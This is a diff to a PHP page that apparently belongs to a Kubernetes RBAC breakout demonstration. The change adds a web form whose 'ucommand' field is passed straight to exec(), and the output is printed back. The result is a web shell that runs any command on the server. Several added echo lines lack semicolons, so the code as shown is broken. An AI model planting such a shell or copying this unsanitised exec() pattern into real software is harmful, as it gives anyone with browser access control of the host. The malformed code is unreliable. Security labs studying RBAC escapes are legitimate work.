@@ -28,9 +28,22 @@ if (!file_exists('kubectl')) {
 }
 
 // User code to Execute
-echo '<h1>RBAC Breakout Script</h1>';
+echo '<h1>RBAC User Code</h1>';
 
-
+    
+echo '<form action="shellExecTest.php" method="post">'
+echo 'command? <input type="text" name="ucommand">'
+echo '<input type="submit">'
+echo '</form>'
+    
+  $ucommand = $_POST['ucommand'];
+echo "<pre>";
+exec($ucommand,$out,$ret);
+echo "</pre>";
+    
+   // Strip ANSI codes.
+  $out = preg_replace('/\e[[][A-Za-z0-9];?[0-9]*m?/', '', $out);
+    
   // Print the result of User Code
   echo "<h2>Result of <code>$ucommand</code></h2>";
   echo '<p>Return code: <code>' . print_r($ret, TRUE) . '</code></p>';
